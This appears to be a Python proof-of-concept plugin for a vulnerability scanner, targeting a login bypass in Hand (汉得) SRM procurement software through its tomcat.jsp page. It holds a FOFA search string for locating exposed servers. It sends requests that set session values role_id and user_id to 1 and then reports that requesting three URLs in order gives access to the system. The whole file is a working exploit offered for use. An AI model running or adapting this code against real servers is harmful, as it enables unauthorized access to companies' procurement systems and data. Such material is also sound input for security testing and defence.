#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://mp.weixin.qq.com/s/EJxpykF2OgYO_INFQEIKYA',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   '汉得SRM tomcat.jsp 登陆绕过',

      'level'     :   'high',

      'FOFA'      :   'body="汉得SRM"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  targets = ['/tomcat.jsp?dataName=role_id&dataValue=1',"/tomcat.jsp?dataName=user_id&dataValue=1",'/main.screen']
  url1 = url + targets[0]
  url2 = url + targets[1]
  url3 = url + targets[2]
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and re.search(r'<title>SRM SERVER Info.</title>.*?Server Info.*?Session 列表.*?role_id.*?=',res.text,re.S):
      res.close()
    else:
      return ret
  except:
    return ret
  try:
    resp=requests.get(url=url2,headers=headers,timeout=5,verify=False)
    # print(resp.text)
    if resp.status_code == 200 and re.search(r'<title>SRM SERVER Info.</title>.*?Server Info.*?Session 列表.*?user_id.*?=.*?',resp.text,re.S):
      resp.close()
      ret['huixian'] = f'先请求:{url1}\n再请求{url2}\n最后请求{url3}\n即可进入系统'
      ret['url'] = url1
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret